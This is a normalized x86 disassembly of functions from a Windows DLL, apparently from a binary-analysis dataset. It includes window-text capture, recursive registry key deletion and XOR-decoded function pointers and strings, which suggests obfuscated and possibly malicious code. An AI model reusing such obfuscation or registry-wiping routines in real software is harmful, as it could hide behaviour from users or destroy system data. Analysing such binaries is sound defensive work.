mov [ ecx ] al
inc ebx
mov ecx esi
call sub_10023e65
sub_1004ac30
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x10 ]
cmp [ edi + 0x34 ] 0x10
lea eax [ edi + 0x20 ]
jb r-xdata
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x14 ]
push ecx
push eax
lea edx [ esi + 0x122 ]
call sub_100514f0
mov edx [ esi + 0x14 ]
add esp 0x8
mov [ edi + 0x380 ] edx
pop edi
mov eax 0x1
pop esi
pop ebp
retn
mov eax [ eax ]
sub_1004ac7a
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx 0xffffffe0
ja r-xdata
push ebx
call sub_1003c644
pop ecx
call sub_1004fd6f
mov [ eax ] 0xc
xor eax eax
push esi
push edi
test ebx ebx
je r-xdata
call sub_100559e6
push 0x1e
call sub_10017abb
push 0xff
call sub_100379d0
xor eax eax
inc eax
mov eax ebx
jmp r-xdata
mov eax edi
pop edi
pop esi
jmp r-xdata
push 0xc
pop esi
cmp [ rw-data ] eax
je r-xdata
push eax
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
pop ebx
pop ebp
retn
call sub_1004fd6f
mov [ eax ] esi
push ebx
call sub_1003c644
pop ecx
test eax eax
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
jmp r-xdata
call sub_1004fd6f
mov [ eax ] esi
sub_1004ad10
push ebp
mov ebp esp
sub esp 0x230
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
push edi
lea eax [ ebp - 0x230 ]
push eax
push ebx
mov [ ebp - 0x22c ] ebx
call [ GetWindowThreadProcessId@IAT ]
xor eax eax
movzx edx ax
mov eax edx
shl edx 0x10
or eax edx
mov ecx 0x82
lea edi [ ebp - 0x20c ]
[ edi ]
push 0x104
lea eax [ ebp - 0x20c ]
push eax
push ebx
call [ GetWindowTextW@IAT ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
mov eax 0x1
pop ebx
call sub_10024145
mov esp ebp
pop ebp
retn 0x8
xor ecx ecx
lea eax [ ebp - 0x20c ]
mov [ ebp - 0x214 ] 0x7
mov [ ebp - 0x218 ] 0x0
mov [ ebp - 0x228 ] cx
lea edx [ eax + 0x2 ]
lea ebx [ ebx ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea edx [ ebp - 0x20c ]
push edx
lea ecx [ ebp - 0x228 ]
call sub_100531b0
mov edx [ esi + 0x4 ]
mov eax edx
lea edi [ eax + 0x2 ]
lea ebx [ ebx ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edi
sar eax 0x1
push eax
push edx
lea eax [ ebp - 0x228 ]
push eax
call sub_10024610
mov ebx eax
cmp ebx 0xffffffff
je r-xdata
cmp [ ebp - 0x214 ] 0x8
jb r-xdata
mov ecx [ ebp - 0x22c ]
xor eax eax
mov [ esi ] ecx
lea edx [ esi + 0x8 ]
movzx esi ax
mov eax esi
shl esi 0x10
or eax esi
mov esi [ ebp - 0x214 ]
mov ecx 0x82
mov edi edx
[ edi ]
mov edi [ ebp - 0x228 ]
mov eax edi
cmp esi 0x8
jae r-xdata
mov edx [ ebp - 0x228 ]
push edx
call sub_1006591f
add esp 0x4
lea ecx [ ebx + ebx ]
push ecx
push eax
push edx
call sub_100796a0
add esp 0xc
cmp esi 0x8
jb r-xdata
lea eax [ ebp - 0x228 ]
pop edi
pop esi
xor eax eax
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn 0x8
push edi
call sub_1006591f
add esp 0x4
sub_1004ae8e
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov esi [ fs : 0x0 ]
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x8 ] r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call RtlUnwind
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
and eax 0xfffffffd
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov edi [ fs : 0x0 ]
mov ebx [ ebp - 0x4 ]
mov [ ebx ] edi
mov [ fs : 0x0 ] ebx
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_1004aef0
push ebp
mov ebp esp
push 0xffffffff
push sub_10082bc0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
mov ebx [ ebp + 0x8 ]
cmp ebx 0x9249249
jbe r-xdata
mov ecx [ esi + 0x8 ]
sub ecx [ esi ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax ebx
jae r-xdata
push r--data
call sub_1002c5ed
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea edi [ esi + 0xc ]
push ebx
mov ecx edi
call sub_1006b4d0
mov [ ebp - 0x4 ] 0x0
mov ebx [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
push ebx
push 0x0
push edi
push eax
push ecx
push edx
mov [ ebp - 0x14 ] eax
call sub_10009b10
mov ebx [ esi ]
mov ecx [ esi + 0x4 ]
sub ecx ebx
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov edi edx
shr edi 0x1f
add esp 0x18
add edi edx
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ eax * 8 ]
sub ecx eax
mov eax [ ebp - 0x14 ]
lea edx [ eax + ecx * 4 ]
lea ecx [ edi * 8 ]
sub ecx edi
mov [ esi + 0x8 ] edx
lea edx [ eax + ecx * 4 ]
mov [ esi + 0x4 ] edx
mov [ esi ] eax
mov ecx [ ebp + 0x8 ]
push ecx
lea eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x4 ]
push eax
push ebx
call sub_10015b10
mov edx [ esi ]
push edx
call sub_1006591f
add esp 0x14
sub_1004b010
push ebp
mov ebp esp
sub esp 0x14
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
push ebx
push esi
xor eax eax
mov bl 0x38
push eax
mov [ ebp - 0x8 ] ecx
mov ecx [ rw-data ]
mov [ ebp + 0x8 ] ecx
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
mov [ ebp - 0x4 ] edx
mov edx [ rw-data ]
mov [ ebp + 0xc ] edx
mov edx [ ebp + 0x8 ]
xor [ ebp + 0xc ] bl
xor [ ebp + 0xd ] bl
xor [ ebp + 0xe ] bl
xor [ ebp + 0xf ] bl
push eax
lea ecx [ ebp - 0x14 ]
push ecx
push edx
push eax
push eax
mov [ ebp - 0x14 ] 0xb
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] eax
call [ ebp + 0xc ]
mov esi eax
mov eax [ rw-data ]
mov [ ebp + 0x8 ] eax
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
push 0xffffffff
push esi
call [ ebp + 0x8 ]
mov ecx [ rw-data ]
mov [ ebp + 0x8 ] ecx
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
push esi
call [ ebp + 0x8 ]
mov edx [ rw-data ]
mov eax [ ebp - 0x10 ]
mov [ ebp + 0x8 ] edx
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
push eax
call [ ebp + 0x8 ]
mov eax [ ebp - 0xc ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_1004b0ca
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100492ed
int3
pop ebp
jmp eax
sub_1004b100
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push edi
mov edi ecx
mov ecx [ r--data ]
mov [ ebp - 0x24 ] 0x0
xor eax eax
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xfffb
and edx 0xff
mov [ ebp + eax * 2 - 0x20 ] dx
inc eax
cmp eax 0xc
jb r-xdata
xor eax eax
lea edx [ ebp - 0x24 ]
push edx
mov [ ebp - 0x8 ] ax
mov eax [ edi + 0x1c ]
mov ecx [ eax ]
lea edx [ ebp - 0x20 ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
je r-xdata
mov eax [ ebp - 0x24 ]
mov ecx [ eax ]
push esi
lea edx [ ebp - 0x28 ]
push edx
push eax
mov eax [ ecx + 0x68 ]
call eax
mov edx [ ebp - 0x28 ]
mov eax edx
lea esi [ eax + 0x2 ]
jmp r-xdata
mov eax 0x1
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax esi
sar eax 0x1
push eax
lea esi [ edi + 0x5c ]
push edx
mov ecx esi
call sub_100531b0
mov ecx [ ebp - 0x28 ]
push ecx
call [ SysFreeString@IAT ]
mov eax [ ebp - 0x24 ]
mov edx [ eax ]
push eax
mov eax [ edx + 0x8 ]
call eax
mov eax [ esi + 0x10 ]
push r--data
xor edi edi
mov ecx esi
mov [ ebp - 0x24 ] 0x0
call sub_10039b60
mov ecx [ ebp - 0x4 ]
neg eax
sbb eax eax
and eax 0xfffffffe
pop esi
xor ecx ebp
add eax 0x2
pop edi
call sub_10024145
mov esp ebp
pop ebp
retn
sub_1004b200
push ebp
mov ebp esp
sub esp 0xb0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
call [ GetCurrentThreadId@IAT ]
cmp [ esi + 0x374 ] eax
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
lea edx [ ebp - 0xb0 ]
mov eax 0x90
call sub_10013830
xor eax eax
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
push sub_1005f610
push sub_1004ac30
push 0x0
push eax
mov eax [ esi + 0x394 ]
mov [ esi + 0x40 ] 0x0
call eax
mov ecx [ ebp - 0x4 ]
xor ecx ebp
add esp 0x10
call sub_10024145
mov esp ebp
pop ebp
retn
sub_1004b275
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x10 ]
call sub_1006a508
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
push edi
mov edi [ ebp + 0xc ]
test edi edi
jne r-xdata
call sub_1004fd6f
mov [ eax ] 0x16
call sub_1001d849
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] 0x0
push esi
jne r-xdata
call sub_1004fd6f
mov [ eax ] 0x16
call sub_1001d849
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
movzx eax [ ebx ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_100054c2
movzx esi ax
movzx eax [ edi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
add ebx 0x2
call sub_100054c2
add esp 0x10
add edi 0x2
movzx eax ax
test si si
je r-xdata
sub ebx edi
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
movzx ecx ax
movzx eax si
sub eax ecx
cmp [ ebp - 0x4 ] 0x0
pop esi
je r-xdata
cmp si ax
je r-xdata
mov esi eax
cmp eax 0x5a
ja r-xdata
pop edi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
add edi 0x2
test si si
je r-xdata
cmp eax 0x5a
ja r-xdata
add eax 0x20
movzx esi ax
jmp r-xdata
cmp si ax
je r-xdata
add eax 0x20
movzx eax ax
movzx eax [ edi ]
cmp eax 0x41
jb r-xdata
movzx eax [ ebx + edi ]
cmp eax 0x41
jb r-xdata
jmp r-xdata
sub_1004b378
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax [ esi + 0x14 ]
push edi
push [ ebp + 0x1c ]
mov edi [ ebp + 0x8 ]
push eax
push r--data
lea eax [ ebp - 0xc ]
mov ebx ecx
push eax
push ebx
call sub_10037958
add esp 0x10
push eax
lea eax [ ebp - 0x4c ]
push 0x40
push eax
call sub_10010183
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push ebx
call sub_100612be
mov ecx [ ebp - 0x4 ]
add esp 0x30
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10024145
leave
retn 0x18
sub_1004b3e6
mov edi edi
push ebp
mov ebp esp
sub esp 0x54
movsx eax [ ebp + 0x28 ]
push esi
mov esi [ ebp + 0x20 ]
push edi
xor edi edi
add eax 0xffffffbf
mov [ ebp - 0x4 ] edi
cmp eax 0x38
ja r-xdata
or [ esi ] 0x2
movzx eax [ eax + lookup_table_1004b6d2 ]
jmp [ eax * 4 + jump_table_1004b676 ]
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
pop edi
mov [ eax + 0x4 ] ecx
pop esi
leave
retn 0x28
or [ esi ] 0x1
push [ ebp + 0x24 ]
mov eax [ ecx ]
push esi
push [ ebp + 0x1c ]
lea edx [ ebp - 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edx
call [ eax + 0x10 ]
mov eax [ ebp - 0xc ]
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x8 ]
push [ ebp + 0x24 ]
mov eax [ ecx ]
push esi
push [ ebp + 0x1c ]
lea edx [ ebp - 0x14 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edx
call [ eax + 0x14 ]
mov eax [ ebp - 0x14 ]
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x10 ]
jmp r-xdata
push r--data
lea eax [ ebp - 0x24 ]
lea eax [ ebp - 0x4 ]
push eax
push 0x63
push edi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ecx
call sub_10062235
or [ esi ] eax
add esp 0x18
test [ esi ] 0x2
jne r-xdata
mov eax [ ebp + 0x24 ]
add eax 0xc
push eax
push 0x1f
push r--data
lea eax [ ebp - 0x2c ]
jmp r-xdata
mov eax [ ebp + 0x24 ]
add eax 0x8
push eax
push 0x17
mov eax [ ebp + 0x24 ]
add eax 0x8
push eax
push 0xb
jmp r-xdata
mov eax [ ebp + 0x24 ]
add eax 0x1c
push eax
push 0x16e
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
push 0xc
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ecx
call sub_10062235
or [ esi ] eax
add esp 0x18
test [ esi ] 0x2
jne r-xdata
mov eax [ ebp + 0x24 ]
add eax 0x4
push eax
push r--data
lea eax [ ebp - 0x34 ]
jmp r-xdata
push r--data
push edi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_10037d87
add esp 0x10
cmp eax edi
jl r-xdata
push r--data
lea eax [ ebp - 0x3c ]
jmp r-xdata
push r--data
lea eax [ ebp - 0x44 ]
jmp r-xdata
push [ ebp + 0x24 ]
jmp r-xdata
push r--data
lea eax [ ebp - 0x4c ]
jmp r-xdata
mov eax [ ebp + 0x24 ]
add eax 0x1c
push eax
push 0x35
jmp r-xdata
mov eax [ ebp + 0x24 ]
add eax 0x18
push eax
push 0x6
jmp r-xdata
push r--data
lea eax [ ebp - 0x54 ]
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
push 0x63
push edi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ecx
call sub_10062235
or [ esi ] eax
add esp 0x18
test [ esi ] 0x2
jne r-xdata
push [ ebp + 0x24 ]
mov eax [ ecx ]
push esi
push [ ebp + 0x1c ]
lea edx [ ebp - 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edx
call [ eax + 0x18 ]
mov eax [ ebp - 0x1c ]
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x18 ]
jmp r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100081b8
test al al
je r-xdata
mov [ ebp + 0x10 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
add eax 0xffffffed
imul eax eax 0x64
push [ ebp + 0x24 ]
push esi
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1003013b
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
jmp r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ecx
call sub_10062235
add esp 0x18
or [ esi ] eax
jmp r-xdata
push edi
jmp r-xdata
push 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x24 ]
dec eax
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov ecx [ ebp + 0x24 ]
imul eax eax 0xc
add [ ecx + 0x8 ] eax
jmp r-xdata
push 0x3b
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp eax 0x45
jge r-xdata
mov ecx [ ebp + 0x24 ]
mov [ ecx + 0x14 ] eax
jmp r-xdata
add eax 0x64
jmp r-xdata
sub_1004b6e9
or [ ebx ] ecx
push ss
push ss
push ss
push ss
push ss
push ss
push ss
add [ ecx ] al
or al 0xd
or eax 0x16011616
push cs
push ss
push ss
movups xmm2 [ esi ]
adc [ esi ] edx
adc dl [ esi ]
adc [ esi ] dl
push ss
adc edx [ edx - 0x33333334 ]
int3
sub_1004b710
push ebp
mov ebp esp
sub esp 0x630
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0xc ]
push 0x410
lea eax [ ebp - 0x628 ]
push 0x0
push eax
call sub_10079a10
add esp 0xc
push edi
push esi
call [ RegDeleteKeyW@IAT ]
test eax eax
jne r-xdata
lea ecx [ ebp - 0x630 ]
push ecx
push 0x20019
push 0x0
push edi
push esi
call [ RegOpenKeyExW@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x630 ]
push 0x0
push 0x0
push 0x0
push 0x0
lea edx [ ebp - 0x62c ]
push edx
lea eax [ ebp - 0x218 ]
push eax
push 0x0
push ecx
mov [ ebp - 0x62c ] 0x104
call [ RegEnumKeyExW@IAT ]
test eax eax
jne r-xdata
sub eax 0x2
neg eax
sbb eax eax
pop edi
and eax 0x2
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x630 ]
push ecx
call [ RegCloseKey@IAT ]
push edi
push esi
call [ RegDeleteKeyW@IAT ]
mov ecx [ ebp - 0x4 ]
neg eax
sbb eax eax
and eax 0xfffffffd
pop edi
xor ecx ebp
add eax 0x3
pop esi
call sub_10024145
mov esp ebp
pop ebp
retn
push ebx
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x30
and edx 0xff
mov [ ebp + eax * 2 - 0x10 ] dx
inc eax
cmp eax 0x5
jb r-xdata
lea ecx [ ebp - 0x218 ]
push ecx
lea edx [ ebp - 0x10 ]
xor eax eax
push edi
push edx
mov ecx 0x208
lea ebx [ ebp - 0x628 ]
mov [ ebp - 0x6 ] ax
call sub_10041b00
mov eax ebx
push eax
push esi
call sub_1004b710
add esp 0x14
test eax eax
je r-xdata
pop ebx
mov eax [ ebp - 0x630 ]
push 0x0
push 0x0
push 0x0
push 0x0
lea ecx [ ebp - 0x62c ]
push ecx
lea edx [ ebp - 0x218 ]
push edx
push 0x0
push eax
mov [ ebp - 0x62c ] 0x104
call [ RegEnumKeyExW@IAT ]
test eax eax
je r-xdata
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
sub_1004b8c0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ r--data ]
mov edx [ r--data ]
mov [ eax ] ecx
xor ecx ecx
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
pop ebp
retn 0x20
sub_1004b8e6
push 0x28
mov eax sub_1007f2ec
call sub_100097c8
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
test ebx ebx
je r-xdata
push 0x4
pop eax
call sub_1004db01
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x10
call sub_10055606
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10039680
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_1004d460
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov [ esi ] r--data
call sub_1000a66f
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
sub_1004b970
push ebp
mov ebp esp
push ecx
test esi esi
je r-xdata
mov eax 0x1
mov esp ebp
pop ebp
retn
test ebx ebx
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push edi
lea edx [ ebp - 0x4 ]
mov eax 0x11c
call sub_10013830
movzx ecx [ esi ]
or edi 0xffffffff
xor eax eax
test cx cx
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov edx 0x7ffffffe
mov eax 0x104
mov ecx ebx
call sub_1006c8f0
test eax eax
jns r-xdata
mov edx [ ebp - 0x4 ]
lea esp [ esp ]
mov ecx [ ebp + 0x8 ]
push esi
push ecx
mov ecx 0x104
call sub_10055350
test eax eax
jns r-xdata
mov eax 0x4
pop edi
mov esp ebp
pop ebp
retn
movzx ecx [ esi + eax * 2 + 0x2 ]
inc eax
test cx cx
jne r-xdata
mov edi eax
xor eax eax
pop edi
mov esp ebp
pop ebp
retn
mov eax 0x5
pop edi
mov esp ebp
pop ebp
retn
cmp cx dx
jne r-xdata
cmp edi 0xffffffff
je r-xdata
test edi edi
je r-xdata
lea edx [ edi + 0x1 ]
cmp edx 0x7ffffffe
jbe r-xdata
push esi
mov eax 0x104
mov ecx ebx
call sub_1006c8f0
test eax eax
jns r-xdata
xor eax eax
mov [ ebx ] ax
mov eax 0x2
pop edi
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
lea ecx [ esi + edi * 2 + 0x2 ]
push ecx
push edx
mov ecx 0x104
call sub_10055350
test eax eax
jns r-xdata
mov eax 0x2
pop edi
mov esp ebp
pop ebp
retn
mov eax 0x3
pop edi
mov esp ebp
pop ebp
retn
sub_1004ba71
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov eax [ esi + 0x14 ]
push edi
push [ ebp + 0x20 ]
mov edi [ ebp + 0x8 ]
push [ ebp + 0x1c ]
mov ebx ecx
push eax
push r--data
lea eax [ ebp - 0xc ]
push eax
push ebx
call sub_10037958
add esp 0x10
push eax
lea eax [ ebp - 0x4c ]
push 0x40
push eax
call sub_10010183
push eax
lea eax [ ebp - 0x4c ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
push ebx
call sub_10015817
mov ecx [ ebp - 0x4 ]
add esp 0x34
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10024145
leave
retn 0x1c
sub_1004baf0
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10068130
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1006591f
add esp 0x4
sub_1004bb20
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov esi [ edi ]
test esi esi
je r-xdata
push 0x8
push 0x40
call [ LocalAlloc@IAT ]
mov [ edi ] eax
test eax eax
jne r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edi eax
mov eax 0x2
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
push 0x8
push 0x40
call [ LocalAlloc@IAT ]
mov edi eax
mov [ esi + 0x4 ] eax
test edi edi
jne r-xdata
mov esi [ esi + 0x4 ]
cmp [ esi + 0x4 ] 0x0
jne r-xdata
xor eax eax
mov ebx [ ebp + 0x8 ]
mov esi eax
call sub_1000d1d0
jmp r-xdata
push 0x58
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
test eax eax
je r-xdata
lea eax [ edi + 0x1 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov [ edi + 0x4 ] 0x0
pop edi
pop esi
xor eax eax
pop ebx
pop ebp
retn 0x4
mov [ edi ] eax
test eax eax
je r-xdata
sub_1004bbc0
push ebp
mov ebp esp
push 0xffffffff
push sub_100808d8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ edi ]
test esi esi
je r-xdata
push 0x8
push 0x40
call [ LocalAlloc@IAT ]
mov [ edi ] eax
test eax eax
jne r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov esi eax
mov eax 0x2
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
push 0x8
push 0x40
call [ LocalAlloc@IAT ]
mov [ esi + 0x4 ] eax
mov esi eax
test esi esi
jne r-xdata
mov esi [ esi + 0x4 ]
cmp [ esi + 0x4 ] 0x0
jne r-xdata
xor eax eax
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx eax
call sub_100121d0
jmp r-xdata
push 0x40
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
lea eax [ esi + 0x1 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
mov [ esi + 0x4 ] 0x0
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x4
mov [ esi ] eax
test eax eax
je r-xdata
sub_1004bc9b
mov edi edi
push ebp
mov ebp esp
sub esp 0x90
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0x14 ]
mov [ ebp - 0x90 ] eax
mov eax [ esi + 0x1c ]
push edi
mov [ ebp - 0x8c ] ecx
mov ecx [ esi + 0x18 ]
mov edi 0x2000
test eax eax
jg r-xdata
mov ebx ecx
mov [ ebp - 0x8 ] eax
test eax eax
jl r-xdata
jl r-xdata
mov [ ebp - 0x88 ] ebx
push 0x24
pop eax
jg r-xdata
test [ esi + 0x14 ] edi
jne r-xdata
test ecx ecx
jne r-xdata
push ecx
push ecx
fstp [ esp ]
push [ ebp - 0x88 ]
lea eax [ ebp - 0xc ]
push ecx
push 0x0
push eax
push [ ebp - 0x8c ]
call sub_1002b48f
add esp 0x10
push eax
lea eax [ ebp - 0x78 ]
push 0x6c
push eax
call sub_10010183
push eax
push ebx
push [ ebp - 0x84 ]
lea eax [ ebp - 0x78 ]
push [ ebp - 0x80 ]
push eax
push [ ebp + 0x18 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp - 0x90 ]
push [ ebp - 0x8c ]
call sub_10031eac
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x90 ]
add esp 0x44
pop edi
pop esi
